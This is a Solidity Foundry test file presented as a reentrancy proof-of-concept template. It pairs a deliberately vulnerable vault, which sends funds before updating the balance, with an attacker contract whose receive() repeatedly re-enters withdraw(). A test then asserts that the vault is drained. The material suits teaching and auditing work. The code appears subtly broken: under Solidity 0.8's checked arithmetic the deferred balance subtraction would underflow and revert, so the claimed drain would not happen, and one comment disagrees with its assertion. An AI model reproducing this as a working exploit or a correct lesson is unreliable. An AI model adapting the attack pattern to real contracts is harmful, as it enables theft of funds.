// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title Reentrancy PoC Template
 * @notice Demonstrates classic reentrancy attack pattern
 */

// Vulnerable contract example
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // VULNERABLE: External call before state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // State update after external call - TOO LATE!
        balances[msg.sender] -= amount;
    }

    receive() external payable {}
}

// Attacker contract
contract ReentrancyAttacker {
    VulnerableVault public target;
    uint256 public attackCount;
    uint256 public maxAttacks;

    constructor(address _target) {
        target = VulnerableVault(_target);
        maxAttacks = 5;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        // Step 1: Deposit initial funds
        target.deposit{value: msg.value}();

        // Step 2: Trigger withdrawal (starts reentrancy)
        target.withdraw(msg.value);
    }

    // Callback that re-enters withdraw()
    receive() external payable {
        if (attackCount < maxAttacks && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw(1 ether);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract ReentrancyPoCTest is Test {
    VulnerableVault vault;
    ReentrancyAttacker attacker;

    address victim = address(0x1);
    address attackerEOA = address(0xBAD);

    function setUp() public {
        // Deploy vulnerable vault
        vault = new VulnerableVault();

        // Victim deposits funds
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // Deploy attacker contract
        vm.prank(attackerEOA);
        attacker = new ReentrancyAttacker(address(vault));
    }

    function test_Exploit_ClassicReentrancy() public {
        // Record initial state
        uint256 vaultBalanceBefore = address(vault).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        console.log("=== Initial State ===");
        console.log("Vault balance:", vaultBalanceBefore / 1e18, "ETH");
        console.log("Attacker balance:", attackerBalanceBefore / 1e18, "ETH");

        // Fund attacker and execute exploit
        vm.deal(attackerEOA, 1 ether);
        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}();

        // Record final state
        uint256 vaultBalanceAfter = address(vault).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        console.log("=== Final State ===");
        console.log("Vault balance:", vaultBalanceAfter / 1e18, "ETH");
        console.log("Attacker balance:", attackerBalanceAfter / 1e18, "ETH");
        console.log("Funds stolen:", (attackerBalanceAfter - 1 ether) / 1e18, "ETH");

        // Verify exploit success
        assertGt(
            attackerBalanceAfter,
            1 ether,  // Attacker started with 1 ETH
            "Attacker should have more than initial deposit"
        );

        assertLt(
            vaultBalanceAfter,
            vaultBalanceBefore,
            "Vault should have lost funds"
        );

        // Verify significant drain
        uint256 stolenAmount = attackerBalanceAfter - 1 ether;
        assertGt(stolenAmount, 4 ether, "Should drain at least 5 ETH");
    }

    function test_Verify_VulnerablePattern() public {
        // This test documents the vulnerable code pattern
        // CEI (Checks-Effects-Interactions) is violated:
        //
        // function withdraw(uint256 amount) external {
        //     require(balances[msg.sender] >= amount);  // CHECK
        //     msg.sender.call{value: amount}("");       // INTERACTION (wrong order!)
        //     balances[msg.sender] -= amount;           // EFFECT (too late!)
        // }

        assertTrue(true, "Pattern documented");
    }
}
